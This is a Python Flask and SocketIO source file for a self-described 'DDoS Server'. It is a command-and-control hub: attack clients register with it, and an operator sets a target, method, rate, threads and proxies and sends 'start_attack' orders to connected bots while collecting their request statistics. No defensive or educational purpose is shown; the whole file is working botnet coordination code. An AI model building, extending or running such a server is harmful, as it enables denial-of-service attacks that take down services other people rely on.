from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, disconnect
import json
import time
import threading
from datetime import datetime
import psutil
import sys
import os
from collections import defaultdict

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secure-secret-key-here'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Global storage
connected_clients = {}
active_attacks = {}
client_stats = defaultdict(dict)
attack_history = []

# Client management
class ClientManager:
    def __init__(self):
        self.clients = {}
        self.client_lock = threading.Lock()
    
    def add_client(self, sid, client_info):
        with self.client_lock:
            self.clients[sid] = {
                'sid': sid,
                'info': client_info,
                'connected_at': datetime.now(),
                'status': 'idle',
                'current_attack': None,
                'stats': {
                    'requests_sent': 0,
                    'success_rate': 0,
                    'rps': 0,
                    'cpu_usage': 0,
                    'memory_usage': 0
                }
            }
        return self.clients[sid]
    
    def remove_client(self, sid):
        with self.client_lock:
            if sid in self.clients:
                client = self.clients.pop(sid)
                # Stop any ongoing attack from this client
                if client['current_attack']:
                    self.stop_client_attack(sid)
                return client
        return None
    
    def update_client_status(self, sid, status, attack_id=None):
        with self.client_lock:
            if sid in self.clients:
                self.clients[sid]['status'] = status
                if attack_id:
                    self.clients[sid]['current_attack'] = attack_id
    
    def update_client_stats(self, sid, stats):
        with self.client_lock:
            if sid in self.clients:
                self.clients[sid]['stats'].update(stats)
    
    def get_client(self, sid):
        return self.clients.get(sid)
    
    def get_all_clients(self):
        return dict(self.clients)
    
    def stop_client_attack(self, sid):
        with self.client_lock:
            if sid in self.clients and self.clients[sid]['current_attack']:
                attack_id = self.clients[sid]['current_attack']
                self.clients[sid]['status'] = 'idle'
                self.clients[sid]['current_attack'] = None
                return attack_id
        return None
    
    def get_client_count(self):
        return len(self.clients)

client_manager = ClientManager()

# Attack management
class AttackManager:
    def __init__(self):
        self.attacks = {}
        self.history = []
        self.attack_lock = threading.Lock()
    
    def create_attack(self, attack_config, creator_sid):
        attack_id = f"attack_{int(time.time())}_{len(self.attacks)}"
        
        with self.attack_lock:
            self.attacks[attack_id] = {
                'id': attack_id,
                'target': attack_config['target'],
                'method': attack_config['method'],
                'layer': attack_config['layer'],
                'duration': attack_config.get('duration', 60),
                'rps': attack_config.get('rps', 100),
                'created_at': datetime.now(),
                'created_by': creator_sid,
                'status': 'starting',
                'assigned_clients': [],
                'results': {
                    'total_requests': 0,
                    'successful_requests': 0,
                    'failed_requests': 0,
                    'total_rps': 0,
                    'start_time': None,
                    'end_time': None
                }
            }
        
        # Broadcast new attack
        socketio.emit('attack_created', {
            'attack_id': attack_id,
            'attack': self.attacks[attack_id]
        }, broadcast=True)
        
        return attack_id
    
    def assign_client_to_attack(self, attack_id, client_sid):
        with self.attack_lock:
            if attack_id in self.attacks:
                if client_sid not in self.attacks[attack_id]['assigned_clients']:
                    self.attacks[attack_id]['assigned_clients'].append(client_sid)
                    return True
        return False
    
    def update_attack_status(self, attack_id, status, results=None):
        with self.attack_lock:
            if attack_id in self.attacks:
                self.attacks[attack_id]['status'] = status
                if results:
                    self.attacks[attack_id]['results'].update(results)
                
                if status in ['completed', 'stopped', 'failed']:
                    self.attacks[attack_id]['results']['end_time'] = datetime.now()
                    self.archive_attack(attack_id)
                
                # Broadcast update
                socketio.emit('attack_updated', {
                    'attack_id': attack_id,
                    'attack': self.attacks[attack_id]
                }, broadcast=True)
    
    def archive_attack(self, attack_id):
        with self.attack_lock:
            if attack_id in self.attacks:
                attack = self.attacks.pop(attack_id)
                self.history.append(attack)
                return attack
        return None
    
    def stop_attack(self, attack_id):
        with self.attack_lock:
            if attack_id in self.attacks:
                self.attacks[attack_id]['status'] = 'stopping'
                
                # Notify all assigned clients to stop
                for client_sid in self.attacks[attack_id]['assigned_clients']:
                    socketio.emit('stop_attack', {
                        'attack_id': attack_id,
                        'reason': 'stopped_by_server'
                    }, room=client_sid)
                
                self.update_attack_status(attack_id, 'stopped')
                return True
        return False
    
    def get_attack(self, attack_id):
        return self.attacks.get(attack_id)
    
    def get_all_attacks(self):
        return dict(self.attacks)
    
    def get_attack_history(self):
        return self.history

attack_manager = AttackManager()

# Flask routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/clients', methods=['GET'])
def get_clients():
    clients = client_manager.get_all_clients()
    return jsonify({
        'total': len(clients),
        'clients': clients
    })

@app.route('/api/attacks', methods=['GET'])
def get_attacks():
    attacks = attack_manager.get_all_attacks()
    history = attack_manager.get_attack_history()
    return jsonify({
        'active': attacks,
        'history': history[-10:]  # Last 10 attacks
    })

@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    data = request.json
    required_fields = ['target', 'method', 'layer']
    
    if not all(field in data for field in required_fields):
        return jsonify({'error': 'Missing required fields'}), 400
    
    # Validate target
    target = data['target']
    if not target.startswith(('http://', 'https://')) and data['layer'] == 'http':
        target = 'http://' + target
    
    attack_config = {
        'target': target,
        'method': data['method'],
        'layer': data['layer'],
        'duration': data.get('duration', 60),
        'rps': data.get('rps', 100),
        'use_proxy': data.get('use_proxy', False),
        'proxy_list': data.get('proxy_list', []),
        'threads': data.get('threads', 100)
    }
    
    attack_id = attack_manager.create_attack(attack_config, 'web_interface')
    
    # Find available clients
    clients = client_manager.get_all_clients()
    available_clients = [sid for sid, client in clients.items() if client['status'] == 'idle']
    
    if not available_clients:
        return jsonify({'error': 'No available clients'}), 400
    
    # Assign clients to attack
    for client_sid in available_clients[:4]:  # Max 4 clients per attack
        if attack_manager.assign_client_to_attack(attack_id, client_sid):
            client_manager.update_client_status(client_sid, 'starting_attack', attack_id)
            
            # Send attack command to client
            socketio.emit('start_attack', {
                'attack_id': attack_id,
                'config': attack_config
            }, room=client_sid)
    
    attack_manager.update_attack_status(attack_id, 'running')
    
    return jsonify({
        'success': True,
        'attack_id': attack_id,
        'assigned_clients': len(available_clients[:4]),
        'message': f'Attack started with {len(available_clients[:4])} clients'
    })

@app.route('/api/attack/stop/<attack_id>', methods=['POST'])
def stop_attack(attack_id):
    if attack_manager.stop_attack(attack_id):
        return jsonify({'success': True, 'message': 'Attack stopped'})
    return jsonify({'error': 'Attack not found'}), 404

@app.route('/api/client/stop/<client_sid>', methods=['POST'])
def stop_client(client_sid):
    client = client_manager.get_client(client_sid)
    if client and client['current_attack']:
        attack_id = client['current_attack']
        attack_manager.stop_attack(attack_id)
        return jsonify({'success': True, 'message': 'Client attack stopped'})
    return jsonify({'error': 'Client not found or not attacking'}), 404

@app.route('/api/stats', methods=['GET'])
def get_stats():
    clients = client_manager.get_all_clients()
    attacks = attack_manager.get_all_attacks()
    
    total_requests = 0
    total_success = 0
    total_rps = 0
    
    for attack in attacks.values():
        total_requests += attack['results']['total_requests']
        total_success += attack['results']['successful_requests']
        total_rps += attack['results']['total_rps']
    
    return jsonify({
        'clients': {
            'total': len(clients),
            'active': len([c for c in clients.values() if c['status'] == 'attacking']),
            'idle': len([c for c in clients.values() if c['status'] == 'idle'])
        },
        'attacks': {
            'active': len(attacks),
            'total_requests': total_requests,
            'success_rate': (total_success / total_requests * 100) if total_requests > 0 else 0,
            'avg_rps': total_rps / len(attacks) if attacks else 0
        },
        'system': {
            'cpu_usage': psutil.cpu_percent(),
            'memory_usage': psutil.virtual_memory().percent,
            'uptime': time.time() - psutil.boot_time()
        }
    })

# SocketIO events
@socketio.on('connect')
def handle_connect():
    client_id = request.sid
    print(f'Client connected: {client_id}')
    
    # Send welcome message
    emit('welcome', {
        'message': 'Connected to DDoS Server',
        'client_id': client_id,
        'server_time': datetime.now().isoformat()
    })

@socketio.on('client_register')
def handle_client_register(data):
    client_id = request.sid
    
    client_info = {
        'id': client_id,
        'name': data.get('name', f'Client_{client_id[:8]}'),
        'hostname': data.get('hostname', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'cpu_count': data.get('cpu_count', 1),
        'memory_total': data.get('memory_total', 0),
        'connection_time': datetime.now().isoformat()
    }
    
    client = client_manager.add_client(client_id, client_info)
    
    # Broadcast new client to all
    emit('client_connected', {
        'client': client,
        'total_clients': client_manager.get_client_count()
    }, broadcast=True)
    
    emit('registration_success', {
        'client_id': client_id,
        'message': 'Registration successful'
    })

@socketio.on('client_stats')
def handle_client_stats(data):
    client_id = request.sid
    client_manager.update_client_stats(client_id, data)
    
    # Broadcast stats update
    emit('stats_updated', {
        'client_id': client_id,
        'stats': data
    }, broadcast=True)

@socketio.on('attack_progress')
def handle_attack_progress(data):
    client_id = request.sid
    attack_id = data.get('attack_id')
    
    if attack_id and attack_id in attack_manager.attacks:
        # Update attack results
        current_results = attack_manager.attacks[attack_id]['results']
        
        # Aggregate results from all clients
        current_results['total_requests'] += data.get('requests_sent', 0)
        current_results['successful_requests'] += data.get('successful_requests', 0)
        current_results['failed_requests'] += data.get('failed_requests', 0)
        
        if data.get('current_rps'):
            current_results['total_rps'] = max(
                current_results.get('total_rps', 0),
                data['current_rps']
            )
        
        attack_manager.update_attack_status(attack_id, 'running', current_results)
    
    # Update client stats
    client_manager.update_client_stats(client_id, {
        'requests_sent': data.get('requests_sent', 0),
        'success_rate': data.get('success_rate', 0),
        'rps': data.get('current_rps', 0),
        'cpu_usage': data.get('cpu_usage', 0),
        'memory_usage': data.get('memory_usage', 0)
    })

@socketio.on('attack_complete')
def handle_attack_complete(data):
    client_id = request.sid
    attack_id = data.get('attack_id')
    
    client_manager.update_client_status(client_id, 'idle', None)
    
    if attack_id:
        # Check if all clients have completed
        attack = attack_manager.get_attack(attack_id)
        if attack:
            all_complete = all(
                client_manager.get_client(sid)['status'] == 'idle'
                for sid in attack['assigned_clients']
            )
            
            if all_complete:
                attack_manager.update_attack_status(
                    attack_id, 
                    'completed',
                    {
                        'total_requests': data.get('total_requests', 0),
                        'successful_requests': data.get('successful_requests', 0),
                        'failed_requests': data.get('failed_requests', 0)
                    }
                )

@socketio.on('attack_error')
def handle_attack_error(data):
    client_id = request.sid
    attack_id = data.get('attack_id')
    
    client_manager.update_client_status(client_id, 'idle', None)
    
    if attack_id:
        attack_manager.update_attack_status(attack_id, 'failed', {
            'error': data.get('error', 'Unknown error')
        })
    
    emit('attack_failed', {
        'attack_id': attack_id,
        'client_id': client_id,
        'error': data.get('error')
    }, broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    client_id = request.sid
    client = client_manager.remove_client(client_id)
    
    if client:
        print(f'Client disconnected: {client_id} ({client["info"]["name"]})')
        
        # Broadcast client disconnect
        emit('client_disconnected', {
            'client_id': client_id,
            'total_clients': client_manager.get_client_count()
        }, broadcast=True)

# Background tasks
def background_stats_update():
    """Send periodic stats updates to all connected clients"""
    while True:
        try:
            stats = {
                'clients': client_manager.get_all_clients(),
                'attacks': attack_manager.get_all_attacks(),
                'timestamp': datetime.now().isoformat()
            }
            socketio.emit('system_stats', stats, broadcast=True)
        except Exception as e:
            print(f"Error sending stats update: {e}")
        
        socketio.sleep(2)  # Update every 2 seconds

if __name__ == '__main__':
    # Start background task
    socketio.start_background_task(background_stats_update)
    
    print("Starting DDoS Server...")
    print("Web interface: http://localhost:5000")
    print("Waiting for clients to connect...")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
